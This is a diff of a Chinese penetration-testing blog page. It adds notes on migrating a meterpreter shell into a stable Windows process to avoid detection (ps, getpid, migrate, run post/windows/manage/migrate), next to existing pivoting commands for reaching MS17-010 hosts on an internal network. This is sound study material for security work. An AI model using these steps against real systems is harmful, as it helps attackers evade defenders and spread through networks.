@@ -63,7 +63,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">3.1k字</span>
+            <span class="post-count">3.3k字</span>
         </span>
     </span>
 
@@ -72,7 +72,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">12分钟</span>
+            <span class="post-count">13分钟</span>
         </span>
     </span>
 </div>
@@ -361,6 +361,18 @@ dns服务器查询`nslookup`</code></pre><h5 id="操作系统机软件信息"><a
 </li>
 </ul>
 <h4 id="4-3-3-Metasploit框架"><a href="#4-3-3-Metasploit框架" class="headerlink" title="4.3.3 Metasploit框架"></a>4.3.3 Metasploit框架</h4><p><em>应用场景：已拿下跳板机（内网服务器）的权限(已用meterpreter模块已拿到shell)，发现内网有大量的存在ms17-010漏洞主机</em></p>
+<hr>
+<p>在刚拿到meterpreter shell时，该shell是极其脆弱的，通过进程迁移，把该shell和一个稳定的进程绑定在一起，防止被检测到查杀。(只有通过windows木马获得的shell才能进行进程迁移操作)</p>
+<ul>
+<li>手动迁移<ol>
+<li>获取目标主机正在运行的进程<br>指令：<code>ps</code></li>
+<li>查看meterpreter shell的进程号<br>指令：<code>getpid</code></li>
+<li>进程迁移 （先找一个稳定的已打开的的应用进程）<br>指令：<code>migrate &lt;稳定的进程号&gt;</code><br>【此办法有可能会失败】</li>
+</ol>
+</li>
+<li>自动进行进程迁移 （系统会自动寻找合适的进程进行迁移）<br>指令：<code>run post/windows/manage/migrate</code></li>
+</ul>
+<hr>
 <ol>
 <li>查看已拿下目标主机的内网ip段情况:<code>run get_local_subnets</code></li>
 <li>添加目标内网的静态路由：<code>run autoroute -s 网段</code>,查看是否成功添加<code>run autoroute -p</code>,将session放入后台<code>backgroud</code></li>
@@ -453,6 +465,15 @@ dns服务器查询`nslookup`</code></pre><h5 id="操作系统机软件信息"><a
   
   
   <nav class="article-nav">
+    
+      <a href="/2020/03/22/msf%E5%90%8E%E6%B8%97%E9%80%8F/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            msf后渗透
+          
+        </div>
+      </a>
     
     
       <a href="/2020/03/12/RCE/" class="article-nav-link">
